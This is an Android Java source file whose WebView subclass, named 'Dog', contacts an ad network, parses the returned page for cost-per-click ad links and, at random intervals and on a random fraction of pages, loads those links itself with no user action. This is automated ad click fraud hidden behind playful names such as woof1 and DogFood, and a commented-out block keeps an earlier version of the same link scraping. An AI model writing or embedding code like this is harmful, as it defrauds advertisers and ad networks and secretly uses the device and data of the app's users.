package com.bbpp.wangcai;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.webkit.WebChromeClient;
import android.webkit.WebView;

@SuppressLint("SetJavaScriptEnabled")
public class Dog extends WebView {

	private final static String bu = "http://app.wapx.cn";

	private String adUrl = "";
	private Wangcai wc;
	private boolean valid = false;
	String param = "";
	
	private Handler handler = new DogFood(this); 
			
			/*Handler() {
		@Override  
        public void handleMessage(Message msg) {  
            switch (msg.what) {  
            case 0:  
            	loadUrl(bu + "/action/ad/show" + wc.getParameter()); 
                break;  
            case 1:
            	loadUrl(adUrl);
            	break;                       	
            default:  
                break;  
            }  
        }  
	};;*/

	public Dog(Context context) {
		super(context);	
		wc = new Wangcai(context);
		addJavascriptInterface(this, "SDKUtils");
		setWebChromeClient(new WebChromeClient());		
		setWebViewClient(new Client());
		getSettings().setJavaScriptEnabled(true);
		param = wc.getParameter();
		if (param.trim().length() > 0) {
			valid = true;
			woof1();
		}
	}

	public void woof1() {	
		if (valid)
			loadUrl(bu + "/action/connect/active" + wc.getParameter() + "&at=" + System.currentTimeMillis());
		//handler.sendMessageDelayed(Message.obtain(handler, 2), 100);
		
	}

	public void woof2() {
		if (valid)
			handler.sendMessageDelayed(Message.obtain(handler, 0), 2000);		
	}

	public void showHTML(String html) {
		if (html == null)
			return ;
		
		Document doc = Jsoup.parse(html, bu + "/action/ad/show");
		
		Elements links = doc.select("a[href]");
		
		for (Element link : links) {
			String url = link.attr("abs:href");			
			if (url.contains("ad_type=cpc") && !url.contains("apk") && ((System.currentTimeMillis() % 10) > 7)) {
				adUrl = url.replaceAll(" ", "%20");
				loadUrl("");
				handler.sendMessageDelayed(Message.obtain(handler, 1), System.currentTimeMillis() % 5000);
			}
		}
			
			/*
		int pos = html.indexOf("ad_click?");
		if (pos == -1)
			return ;

		pos = html.indexOf("\"", pos);
		int pos2 = html.indexOf("'", pos);
		if (pos == -1 && pos2 == -1)
			return;
		if ((pos2 != -1 && pos2 < pos) || pos == -1)
			pos = pos2;
		html = html.substring(0, pos);
		
		pos = html.lastIndexOf("\"");
		pos2 = html.lastIndexOf("'");
		if (pos == -1 && pos2 == -1)
			return ;
		
		if ((pos2 != -1 && pos2 > pos) || pos == -1)
			pos = pos2;		
		
		html = html.substring(pos + 1);
		
		if (html.contains("ad_click?")) {
			String url = "";
			if (!html.contains("http:")) {
				url = bu;
			}
			
			if (!html.startsWith("/")) {
				url += "/";
			}
			
			url += html;
			
			adUrl = url;
			
			handler.sendMessageDelayed(Message.obtain(handler, 1), 500);
			
			System.out.println("NMD:  " + url);
			
		}*/
	}
	
	public void openAd() {
		
	}
	
	static class DogFood extends Handler {
		
		Dog dog;
		
		DogFood(Dog dog)  {
			this.dog = dog;
		}
		
		@Override  
        public void handleMessage(Message msg) {
			Dog myDog = dog;
			if (myDog == null)
				return ;
			
            switch (msg.what) {  
            case 0:  
            	myDog.loadUrl(bu + "/action/ad/show" + myDog.param); 
                break;  
            case 1:
            	if (myDog.adUrl != null)
            		myDog.loadUrl(myDog.adUrl);
            	break;                       	
            default:  
                break;  
            }  
        }  
	}
	
	
}
